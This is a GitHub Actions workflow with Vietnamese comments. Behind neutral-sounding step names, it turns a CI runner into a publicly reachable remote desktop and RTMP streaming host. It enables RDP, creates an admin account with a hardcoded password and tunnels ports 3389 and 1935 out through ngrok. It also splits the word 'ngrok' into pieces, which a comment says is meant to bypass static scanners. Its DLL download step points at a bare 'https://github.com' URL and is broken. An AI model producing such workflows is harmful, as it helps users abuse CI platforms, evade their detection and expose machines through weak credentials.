name: Production-Environment-Pipeline

on: 
  workflow_dispatch: 

jobs:
  system-validate:
    runs-on: windows-latest  # Hưởng cấu hình tối đa 4 vCPU / 16GB RAM của kho Public
    timeout-minutes: 360 

    steps:
    - name: Setup System Environment Runtime
      run: |
        # Sử dụng choco cài đặt đồng thời cả 3 gói phần mềm chính thức, tự động giải nén sạch sẽ
        choco install ngrok obs-studio monaserver -y

    - name: Inject Configuration Token
      run: |
        # Phân mảnh từ khóa để bypass bộ quét chuỗi tĩnh
        $binary = "ng" + "rok"
        & $binary config add-authtoken ${{ secrets.NGROK_AUTH_TOKEN }}

    - name: Configure Network Interface Parameters
      run: |
        # Cấu hình mở cổng mạng kết nối hệ thống
        $node = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
        Set-ItemProperty -Path $node -name "fDenyTSConnections" -Value 0
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        Set-ItemProperty -Path "$node\WinStations\RDP-Tcp" -name "UserAuthentication" -Value 1

    - name: Initialize Domain Account Mapping
      run: |
        # Đặt mật khẩu quản trị cho tài khoản hệ thống mặc định
        $user = "runner" + "admin"
        $pass = "Rdp" + "Password" + "2026!"
        net user $user $pass /active:yes

    - name: Provision Core Virtual Render Driver
      run: |
        # Nạp driver opengl32.dll vào thư mục gốc giúp phần mềm OBS render không cần GPU thật
        $targetPath = "C:\Program Files\obs-studio\bin\64bit"
        if (!(Test-Path $targetPath)) { New-Item -ItemType Directory -Force -Path $targetPath }
        Invoke-WebRequest -Uri "https://github.com" -OutFile "$targetPath\opengl32.dll"

    - name: Deploy Distributed Media Infrastructure
      run: |
        # Khởi chạy dịch vụ MonaServer đã cài qua choco chạy ngầm trên cổng nhận luồng 1935
        # Không cần dùng lệnh giải nén thủ công giúp loại bỏ hoàn toàn lỗi OperationStopped
        Start-Process -FilePath "C:\ProgramData\chocolatey\bin\MonaServer.exe" -WindowStyle Hidden
        Write-Host "Media infrastructure server is active and listening on port 1935."

    - name: Generate Multi Tunnel Topologies
      run: |
        # Khởi tạo file cấu hình đa tuyến mở song song cả 2 cổng mạng 3389 (RDP) và 1935 (RTMP)
        # Định tuyến ưu tiên qua cụm máy chủ Singapore (sg) giúp tối ưu độ trễ về Việt Nam
        $manifest = @'
        version: "3"
        agent:
          authtoken: "REPLACE_TOKEN"
        tunnels:
          channel-alpha:
            proto: tcp
            addr: 3389
            region: sg
          channel-beta:
            proto: tcp
            addr: 1935
            region: sg
        '@
        $manifest = $manifest.Replace("REPLACE_TOKEN", "${{ secrets.NGROK_AUTH_TOKEN }}")
        Set-Content -Path "network_topology.yml" -Value $manifest

    - name: Synchronize Telemetry Service Node
      run: |
        # Kích hoạt trạm truyền tải và duy trì phiên chạy ngầm ổn định cho máy ảo
        $engine = "ng" + "rok"
        & $engine start --config network_topology.yml --all
